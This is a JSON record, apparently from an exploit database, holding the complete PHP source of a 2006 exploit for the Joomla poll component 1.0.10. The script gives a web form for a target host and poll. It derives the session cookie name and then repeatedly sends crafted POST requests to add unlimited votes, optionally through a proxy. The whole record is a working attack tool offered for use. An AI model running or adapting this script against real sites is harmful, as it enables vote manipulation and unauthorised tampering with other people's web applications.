{
  "id": "2219",
  "title": "Joomla! Component Poll 1.0.10 - Arbitrary Add Votes",
  "cve": null,
  "vuln_type": "unknown",
  "code": "<?php\r\n#          Joomla [poll component] add unlimited votes            #\r\n#            Computer Security Researchers Institute              #\r\n#              works regardless of php.ini settings               #\r\n#                          by trueend5                            #\r\n#                     [http://www.KAPDA.ir]                       #\r\n\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 2);\r\nob_implicit_flush (1);\r\n\r\necho '<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\">\r\n<title>Joomla [poll component] arbitrary add votes</title>\r\n</head>\r\n<body bgcolor=\"#FFCCFF\">\r\n<p align=\"center\"><font size=\"4\" color=\"#0000FF\">Joomla&nbsp; [poll\r\ncomponent] arbitrary add votes</font></p>\r\n<p class=\"Stile6\" align=\"center\"><font size=\"3\" color=\"#FF0000\">by trueend5</font></p>\r\n<p align=\"center\"><font size=\"4\" color=\"#008000\">Computer Security Researchers\r\nInstitute</font></p>\r\n<font SIZE=\"3\">\r\n<p align=\"center\"><b><a href=\"http://www.kapda.ir\"><font color=\"#000000\">KAPDA</font></a>.ir</b></p>\r\n\r\n<p align=\"center\">&nbsp;</p>\r\n</font>\r\n<table width=\"90%\">\r\n  <tbody>\r\n    <tr>\r\n      <td width=\"43%\" align=\"left\">\r\n        <form name=\"form1\" action=\"'.$SERVER[PHP_SELF].'\" method=\"post\">\r\n          <p><input name=\"host\" size=\"20\"> <span class=\"Stile5\"><font color=\"#FF0000\">*</font> hostname (ex: www.sitename.com)</span></p>\r\n\r\n          <p><input name=\"path\" size=\"20\"> <span class=\"Stile5\"><font color=\"#FF0000\">*</font> path (ex: /joomla/\r\n          or just / )</span></p>\r\n          <p><input name=\"pollid\" size=\"20\"> <span class=\"Stile5\"><font color=\"#FF0000\">\r\n\t\t\t*</font> pollid (ex: index.php?option=com_poll&amp;task=results&amp;<b><font size=\"4\">id=14</font></b> )</span></p>\r\n\r\n          <p><input name=\"voteid\" size=\"20\"><span class=\"Stile5\"><font color=\"#FF0000\">\r\n\t\t\t*</font> voteid ( <b><u>1</u></b> for first option, <b><u>2</u></b>\r\n\t\t\tfor second one , <b><u>3</u></b> for third and so... )</span></p>\r\n\r\n\t\t\t<p><input name=\"hits\" size=\"20\"><span class=\"Stile5\"><font color=\"#FF0000\">\r\n\t\t\t*</font>\r\n\t\t\thits ( number of votes that you want to add ) </span></p>\r\n          <p><input name=\"port\" size=\"20\"><span class=\"Stile5\">&nbsp;&nbsp;&nbsp; specify a port&nbsp;\r\n          (default: 80)</span></p>\r\n          <p><input name=\"proxy\" size=\"20\" ><span class=\"Stile5\">&nbsp;&nbsp;&nbsp; send exploit\r\n          through an HTTP proxy (ip:port)</span></p>\r\n\r\n          <p align=\"center\"> <span class=\"Stile5\"><font color=\"#FF0000\">&nbsp;&nbsp;\r\n          * </font>fields are required</span></p>\r\n          <p align=\"center\"><span class=\"Stile5\">-----------------------------------------------------------------------------------------------</span></p>\r\n\r\n          <p><input type=\"submit\" value=\"Start\" name=\"Submit\"></p>\r\n        </form></td></tr></tbody></table></body></html>';\r\n\r\n\r\nfunction show($headeri)\r\n{\r\n$ii=0;\r\n$ji=0;\r\n$ki=0;\r\n$ci=0;\r\necho '<table border=\"0\"><tr>';\r\nwhile ($ii <= strlen($headeri)-1)\r\n{\r\n$datai=dechex(ord($headeri[$ii]));\r\nif ($ji==16) {\r\n             $ji=0;\r\n             $ci++;\r\n             echo \"<td>&nbsp;&nbsp;</td>\";\r\n             for ($li=0; $li<=15; $li++)\r\n                      { echo \"<td>\".$headeri[$li+$ki].\"</td>\";\r\n\t\t\t    }\r\n            $ki=$ki+16;\r\n            echo \"</tr><tr>\";\r\n            }\r\nif (strlen($datai)==1) {echo \"<td>0\".$datai.\"</td>\";} else\r\n{echo \"<td>\".$datai.\"</td> \";}\r\n$ii++;\r\n$ji++;\r\n}\r\nfor ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)\r\n                      { echo \"<td>&nbsp&nbsp</td>\";\r\n                       }\r\n\r\nfor ($li=$ci*16; $li<=strlen($headeri); $li++)\r\n                      { echo \"<td>\".$headeri[$li].\"</td>\";\r\n\t\t\t    }\r\necho \"</tr></table>\";\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacket() \r\n\r\n{\r\n  global $proxy, $host, $port, $packet, $html, $proxy_regex;\r\n  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\r\n  if ($socket < 0) {\r\n                   echo \"socket_create() failed: reason: \" . socket_strerror($socket) . \"<br>\";\r\n                   }\r\n\t      else\r\n \t\t  {   $c = preg_match($proxy_regex,$proxy);\r\n              if (!$c) {echo 'Not a valid proxy...';\r\n                        die;\r\n                       }\r\n                    echo \"OK.<br>\";\r\n                    echo \"Attempting to connect to \".$host.\" on port \".$port.\"...<br>\";\r\n                    if ($proxy=='')\r\n\t\t   {\r\n\t\t     $result = socket_connect($socket, $host, $port);\r\n\t\t   }\r\n\t\t   else\r\n\t\t   {\r\n\r\n\t\t   $parts =explode(':',$proxy);\r\n                   echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t\t   $result = socket_connect($socket, $parts[0],$parts[1]);\r\n\t\t   }\r\n\t\t   if ($result < 0) {\r\n                                     echo \"socket_connect() failed.\\r\\nReason: (\".$result.\") \" . socket_strerror($result) . \"<br><br>\";\r\n                                    }\r\n\t                       else\r\n\t\t                    {\r\n                                     echo \"OK.<br><br>\";\r\n                                     $html= '';\r\n                                     socket_write($socket, $packet, strlen($packet));\r\n                                     echo \"Reading response:<br>\";\r\n                                     while ($out= socket_read($socket, 2048)) {$html.=$out;}\r\n                                     echo nl2br(htmlentities($html));\r\n                                     echo \"Closing socket...\";\r\n                                     socket_close($socket);\r\n\r\n\t\t\t\t    }\r\n                  }\r\n}\r\nfunction sendpacketii($packet)\r\n{\r\nglobal $proxy, $host, $port, $html, $proxy_regex;\r\nif ($proxy=='')\r\n           {$ock=fsockopen(gethostbyname($host),$port);}\r\n             else\r\n           {\r\n\t   $c = preg_match($proxy_regex,$proxy);\r\n              if (!$c) {echo 'Not a valid proxy...';\r\n                        die;\r\n                       }\r\n\t   $parts=explode(':',$proxy);\r\n\t    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t    $ock=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$ock) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n\t\t       }\r\n\t   }\r\nfputs($ock,$packet);\r\nif ($proxy=='')\r\n  {\r\n\r\n    $html='';\r\n    while (!feof($ock))\r\n      {\r\n        $html.=fgets($ock);\r\n      }\r\n  }\r\nelse\r\n  {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))\r\n    {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\nfclose($ock);\r\n//echo nl2br(htmlentities($html));\r\n}\r\n\r\n  $host=trim($_POST[host]);\r\n  $path=trim($_POST[path]);\r\n  $port=intval(trim($_POST[port]));\r\n  $pollid=intval(trim($_POST[pollid]));\r\n  $voteid=intval(trim($_POST[voteid]));\r\n  $hits=intval(trim($_POST[hits]));\r\nif (($host<>'') and ($path<>'') and ($pollid<>'') and ($voteid<>'') and ($hits<>''))\r\n{\r\n  $host=str_replace(\"\\r\\n\",\"\",$host);\r\n  $path=str_replace(\"\\r\\n\",\"\",$path);\r\n  if ($port=='') {$port=80;}\r\n  if ($hits=='') {$hits=200;}\r\n  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\n  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n  $livesite=$host;\r\n  if ($path=='/') {$livepath='';} else $livepath=substr(\"$path\", 0, strlen($path)-1);\r\n  $sessionpath='http://'.$livesite.$livepath;\r\n\r\n  $packet=\"HEAD \".$p.\"index.php HTTP/1.1\\r\\n\";\r\n  $packet.=\"User-Agent: Shareaza v1.x.x.xx\\r\\n\";\r\n  $packet.=\"Host: \".$host.\"\\r\\n\";\r\n  $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n  show($packet);\r\n  sendpacketii($packet);\r\n  echo nl2br(htmlentities($html));\r\n\r\n  //trying to obtain cookiename from HEADER\r\n  $pattern=\"([a-z0-9]{32}=)\";\r\n  if(preg_match($pattern, $html, $matches)) {$match=$matches[0];\r\n  $sessionCookieName=substr(\"$match\", 0, strlen($match)-1);\r\n  } else\r\n  //trying to generate cookiename\r\n  {$sessionCookieName= md5( 'site'.$sessionpath );}\r\n\r\n  for ($t = 14; $t < $pollid; $t++) {$voteid=$voteid + 12;}\r\n  $data=\"voteid=\".$voteid.\"\";\r\n  $packet=\"POST \".$p.\"index.php?option=com_poll&task=vote&id=\".$pollid.\"&\".$sessionCookieName.\"=1 HTTP/1.0\\r\\n\";\r\n  $packet.=\"Host: \".$host.\"\\r\\n\";\r\n  $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n  $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n  $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n  $packet.=$data;\r\n  show($packet);\r\n  sendpacketii($packet);\r\n  echo nl2br(htmlentities($html));\r\n\r\n  if (!eregi(\"Location\",$html)) {\r\n  echo \"\\n\\nExploit failed...\"; die();\r\n }\r\n                           else {\r\n  for ($n = 2; $n <= $hits; $n++) {\r\n  \r\n  $data=\"voteid=\".$voteid.\"\";\r\n  $packet=\"POST \".$p.\"index.php?option=com_poll&task=vote&id=\".$pollid.\"&\".$sessionCookieName.\"=1 HTTP/1.0\\r\\n\";\r\n  $packet.=\"Host: \".$host.\"\\r\\n\";\r\n  $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n  $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n  $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n  $packet.=$data;\r\n  sendpacketii($packet);\r\n\r\n  if (!eregi(\"Location\",$html)) {\r\n  echo \"\\n\\nExploit failed...\"; die();\r\n   }\r\n  echo \"<br />\".$n.\":added.\";\r\n }\r\n                            echo \"<br /> Exploit succeeded <br />\";\r\n                            echo'<p align=\"center\"><a href=\"'.$sessionpath.'/index.php?option=com_poll&task=results&id='.$pollid.'\"><font color=\"#0000FF\">Results</font></a></p>';\r\n                            }\r\n}\r\nelse\r\n{echo 'Fill in requested fields, optionally specify a proxy';}\r\n?>\r\n\r\n# milw0rm.com [2006-08-19]",
  "url": "https://www.exploit-db.com/exploits/2219"
}